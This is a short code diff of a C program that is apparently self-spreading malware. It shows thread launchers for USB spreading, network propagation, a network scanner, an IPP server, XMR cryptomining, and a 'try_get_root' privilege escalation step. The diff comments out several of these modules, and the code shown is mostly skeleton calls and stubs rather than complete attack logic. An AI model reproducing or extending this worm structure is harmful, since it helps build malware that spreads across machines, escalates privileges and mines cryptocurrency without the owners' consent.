@@ -22,11 +22,13 @@ void * start_ipp_server(void *varg){
     serve(global);
 }
 
+/*
 void * start_usb_propagate(void *varg) {
     Globals *global = (Globals *) varg;
     DEBUG_LOG("[ENTRY] Starting usb spreading module...\n");
     //startUSBSpreadModule
 }
+*/
 
 void * start_xmr(void *varg) {
     Globals *global = (Globals *) varg;
@@ -38,14 +40,15 @@ void entry(Globals *global) {
     /*
     // try to gain root
     try_get_root(global);
+*/
 
     // load the file content into the global buffer
-    load_file_bytes(global);
+    //load_file_bytes(global);
 
     // start propagate
-    pthread_t thread_id_propagate;
-    global->pthread_create(&thread_id_propagate, NULL, start_propagate, global);
-
+    //pthread_t thread_id_propagate;
+    //global->pthread_create(&thread_id_propagate, NULL, start_propagate, global);
+/*
     // start network scanner
     pthread_t thread_id_scanner;
     global->pthread_create(&thread_id_scanner, NULL, start_network_scanner, global);
